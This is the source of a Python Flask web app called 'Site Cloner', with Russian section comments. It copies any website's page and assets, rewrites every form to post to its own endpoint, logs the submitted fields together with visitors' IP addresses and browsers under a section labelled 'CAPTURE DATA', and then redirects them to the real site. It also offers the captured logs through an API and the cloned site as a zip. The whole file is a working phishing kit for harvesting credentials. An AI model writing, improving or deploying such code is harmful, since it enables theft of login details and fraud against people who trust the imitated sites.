from flask import Flask, render_template, request, send_file, jsonify
import requests
from bs4 import BeautifulSoup
import os
import shutil
from urllib.parse import urljoin, urlparse
import zipfile
import time
import re
import hashlib
import json

app = Flask(__name__)
PROJECTS = {}

# ========== ГЛАВНАЯ ==========
@app.route('/')
def home():
    return '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Cloner</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0f;color:#e0e0e0;font-family:Arial,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
        .box{max-width:500px;width:100%}
        h1{text-align:center;font-size:28px;margin-bottom:20px;color:#667eea}
        .card{background:#111122;border-radius:16px;padding:25px;border:1px solid #222}
        label{display:block;margin-bottom:8px;color:#aaa;font-size:14px}
        input{width:100%;padding:14px;border:1px solid #333;border-radius:12px;background:#0a0a14;color:#fff;font-size:16px;margin-bottom:15px}
        input:focus{outline:none;border-color:#667eea}
        button{width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;color:#fff;background:#667eea}
        button:hover{opacity:0.85}
        button:disabled{opacity:0.4}
        .result{margin-top:20px;padding:20px;border-radius:12px;display:none;word-break:break-all}
        .result.show{display:block}
        .result.success{background:#0a2a0a;border:1px solid #0f0}
        .result.error{background:#2a0a0a;border:1px solid #f00}
        .result a{color:#667eea}
        .loading{display:none;text-align:center;padding:15px;color:#888}
        .spinner{width:30px;height:30px;border:3px solid #333;border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .stats{display:flex;gap:10px;margin-bottom:15px}
        .stat{flex:1;text-align:center;padding:10px;background:#0a0a14;border-radius:8px}
        .stat .num{font-size:24px;color:#667eea}
        .stat .lbl{font-size:11px;color:#888}
        .btn-dl{display:inline-block;background:#667eea;color:#fff;padding:10px 20px;border-radius:8px;text-decoration:none;margin-top:10px;font-size:14px}
    </style>
</head>
<body>
    <div class="box">
        <h1>SITE CLONER</h1>
        <div class="card">
            <label>Website URL</label>
            <input type="text" id="urlInput" placeholder="https://example.com" autofocus>
            <button onclick="cloneSite()" id="cloneBtn">CLONE SITE</button>
        </div>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div>Cloning...</div>
        </div>
        <div class="result" id="result"></div>
    </div>
    <script>
        async function cloneSite(){
            var url=document.getElementById('urlInput').value.trim();
            if(!url)return;
            var btn=document.getElementById('cloneBtn');
            var load=document.getElementById('loading');
            var res=document.getElementById('result');
            btn.disabled=true;
            load.style.display='block';
            res.classList.remove('show');
            try{
                var r=await fetch('/api/clone',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:url})});
                var d=await r.json();
                if(d.error){
                    res.innerHTML='<b>Error:</b> '+d.error;
                    res.classList.add('show','error');
                }else{
                    res.innerHTML='<div class="stats"><div class="stat"><div class="num">'+d.assets+'</div><div class="lbl">Files</div></div><div class="stat"><div class="num">'+d.forms+'</div><div class="lbl">Forms</div></div></div><b>Clone URL:</b><br><a href="'+d.url+'" target="_blank">'+d.url+'</a><br><br><a href="'+d.download+'" class="btn-dl">DOWNLOAD ZIP</a><br><br><b>Logs:</b><br><a href="/api/logs/'+d.id+'" target="_blank">/api/logs/'+d.id+'</a>';
                    res.classList.add('show','success');
                }
            }catch(e){
                res.innerHTML='<b>Error:</b> '+e.message;
                res.classList.add('show','error');
            }
            btn.disabled=false;
            load.style.display='none';
        }
        document.getElementById('urlInput').addEventListener('keydown',function(e){if(e.key==='Enter')cloneSite()});
    </script>
</body>
</html>'''

# ========== API CLONE ==========
@app.route('/api/clone', methods=['POST'])
def api_clone():
    data = request.get_json(silent=True) or {}
    url = data.get('url', '').strip()
    
    if not url:
        return jsonify({'error': 'URL required'}), 400
    if not url.startswith('http'):
        url = 'https://' + url
    
    pid = hashlib.md5((url + str(time.time())).encode()).hexdigest()[:12]
    out = '/tmp/' + pid
    assets_dir = out + '/assets'
    
    os.makedirs(assets_dir, exist_ok=True)
    
    sess = requests.Session()
    sess.headers['User-Agent'] = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15'
    
    try:
        r = sess.get(url, allow_redirects=True, timeout=20)
        if r.status_code != 200:
            return jsonify({'error': 'HTTP ' + str(r.status_code)}), 400
        
        soup = BeautifulSoup(r.text, 'html.parser')
        domain = urlparse(r.url).netloc
        assets = 0
        forms = 0
        
        # CSS
        for tag in soup.find_all('link', href=True):
            href = tag['href'].strip()
            if not href: continue
            if not href.startswith('http'):
                href = urljoin(url, href)
            try:
                name = os.path.basename(urlparse(href).path.split('?')[0])
                if not name or '.' not in name: name = 'style.css'
                ar = sess.get(href, timeout=10)
                if ar.status_code == 200 and len(ar.content) > 100:
                    with open(assets_dir + '/' + name, 'wb') as f:
                        f.write(ar.content)
                    tag['href'] = '/p/' + pid + '/assets/' + name
                    assets += 1
            except: pass
        
        # JS
        for tag in soup.find_all('script', src=True):
            src = tag['src'].strip()
            if not src: continue
            if not src.startswith('http'):
                src = urljoin(url, src)
            try:
                name = os.path.basename(urlparse(src).path.split('?')[0])
                if not name or '.' not in name: name = 'script.js'
                ar = sess.get(src, timeout=10)
                if ar.status_code == 200 and len(ar.content) > 100:
                    with open(assets_dir + '/' + name, 'wb') as f:
                        f.write(ar.content)
                    tag['src'] = '/p/' + pid + '/assets/' + name
                    assets += 1
            except: pass
        
        # IMG
        for tag in soup.find_all('img', src=True):
            src = tag['src'].strip()
            if not src or src.startswith('data:'): continue
            if not src.startswith('http'):
                src = urljoin(url, src)
            try:
                ext = os.path.splitext(urlparse(src).path.split('?')[0])[1] or '.png'
                name = 'img_' + str(abs(hash(src)))[:8] + ext
                ar = sess.get(src, timeout=10)
                if ar.status_code == 200 and len(ar.content) > 100:
                    with open(assets_dir + '/' + name, 'wb') as f:
                        f.write(ar.content)
                    tag['src'] = '/p/' + pid + '/assets/' + name
                    assets += 1
            except: pass
        
        # Forms
        for form in soup.find_all('form'):
            form['action'] = '/submit/' + pid
            form['method'] = 'POST'
            forms += 1
        
        # Save HTML
        body = soup.find('body')
        html_body = str(body) if body else str(soup)
        
        html = '<!DOCTYPE html>\n<html>\n<head>\n'
        html += '<meta charset="UTF-8">\n'
        html += '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
        html += '<title>' + domain + '</title>\n'
        for tag in soup.find_all('link', href=True):
            html += str(tag) + '\n'
        html += '</head>\n<body>\n' + html_body + '\n</body>\n</html>'
        
        with open(out + '/index.html', 'w', encoding='utf-8') as f:
            f.write(html)
        
        PROJECTS[pid] = {
            'url': url,
            'domain': domain,
            'dir': out,
            'assets': assets,
            'forms': forms,
            'logs': [],
            'time': time.ctime()
        }
        
        host = request.host_url.rstrip('/')
        clone_url = host + '/p/' + pid
        download_url = host + '/api/download/' + pid
        
        return jsonify({
            'id': pid,
            'url': clone_url,
            'download': download_url,
            'assets': assets,
            'forms': forms,
            'domain': domain
        })
        
    except Exception as e:
        return jsonify({'error': str(e)[:200]}), 500

# ========== SERVE CLONED SITE ==========
@app.route('/p/<pid>')
def serve_project(pid):
    path = '/tmp/' + pid + '/index.html'
    if os.path.exists(path):
        return open(path, encoding='utf-8').read()
    return 'Not found', 404

@app.route('/p/<pid>/assets/<name>')
def serve_asset(pid, name):
    path = '/tmp/' + pid + '/assets/' + name
    if os.path.exists(path):
        ct = 'text/css' if name.endswith('.css') else 'application/javascript' if name.endswith('.js') else 'image/png'
        return open(path, 'rb').read(), 200, {'Content-Type': ct}
    return 'Not found', 404

# ========== SUBMIT (CAPTURE DATA) ==========
@app.route('/submit/<pid>', methods=['POST'])
def submit_data(pid):
    data = dict(request.form)
    data['ip'] = request.remote_addr
    data['time'] = time.strftime('%Y-%m-%d %H:%M:%S')
    data['ua'] = request.headers.get('User-Agent', '?')
    
    if pid in PROJECTS:
        PROJECTS[pid].setdefault('logs', []).append(data)
    
    log_file = '/tmp/' + pid + '/logs.json'
    with open(log_file, 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    redirect_to = PROJECTS.get(pid, {}).get('url', 'https://google.com')
    return '<script>window.location.href="' + redirect_to + '";</script>'

# ========== API LOGS ==========
@app.route('/api/logs/<pid>')
def api_logs(pid):
    proj = PROJECTS.get(pid, {})
    logs = proj.get('logs', [])
    return jsonify({'logs': logs, 'count': len(logs)})

# ========== DOWNLOAD ==========
@app.route('/api/download/<pid>')
def api_download(pid):
    if pid not in PROJECTS:
        return 'Not found', 404
    zip_path = '/tmp/' + pid + '.zip'
    shutil.make_archive('/tmp/' + pid, 'zip', PROJECTS[pid]['dir'])
    return send_file(zip_path, as_attachment=True, download_name='clone_' + pid + '.zip')

# ========== START ==========
if __name__ == '__main__':
    os.makedirs('/tmp', exist_ok=True)
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
